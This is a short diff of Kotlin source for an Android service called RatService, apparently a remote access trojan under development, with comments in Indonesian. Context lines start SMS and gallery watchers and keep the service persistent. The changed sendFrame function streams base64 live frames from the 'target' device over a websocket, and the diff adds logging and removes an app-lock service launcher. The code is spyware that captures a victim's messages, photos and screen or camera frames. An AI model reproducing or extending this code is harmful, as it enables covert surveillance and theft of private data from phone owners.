@@ -67,17 +67,6 @@ class RatService : Service() {
         try { smsWatcher?.start() } catch (_: Exception) {}
         try { galleryWatcher?.start() } catch (_: Exception) {}
         startSmsPolling()
-
-        // Pastikan AppLockForegroundService jalan
-        try {
-            val svcIntent = Intent(this, AppLockForegroundService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(svcIntent)
-            } else {
-                startService(svcIntent)
-            }
-        } catch (_: Exception) {}
-
         return START_STICKY
     }
 
@@ -119,8 +108,10 @@ class RatService : Service() {
     }
 
     private fun connect() {
+        // Ambil username dari SharedPreferences — JANGAN fallback ke "unknown"
         val owner = userPrefs.getString("username", "") ?: ""
         if (owner.isEmpty()) {
+            // Belum setup, tunggu
             return
         }
 
@@ -182,20 +173,23 @@ class RatService : Service() {
     }
 
     fun sendFrame(frameType: String, base64Data: String) {
-        try {
-            val payload = JsonObject().apply {
-                addProperty("type", "event")
-                add("data", gson.toJsonTree(mapOf(
-                    "type" to "live_frame",
-                    "frame_type" to frameType,
-                    "data" to base64Data,
-                    "ts" to System.currentTimeMillis()
-                )))
-            }
-            ws?.send(gson.toJson(payload))
-        } catch (_: Exception) {}
+    try {
+        val payload = JsonObject().apply {
+            addProperty("type", "event")
+            add("data", gson.toJsonTree(mapOf(
+                "type" to "live_frame",
+                "frame_type" to frameType,
+                "data" to base64Data,
+                "ts" to System.currentTimeMillis()
+            )))
+        }
+        ws?.send(gson.toJson(payload))
+        android.util.Log.i("RatService", "Frame sent: $frameType size=${base64Data.length}")
+    } catch (e: Exception) {
+        android.util.Log.e("RatService", "sendFrame error", e)
     }
-
+}
+    
     fun sendChatFromTarget(text: String) {
         try {
             val payload = JsonObject().apply {
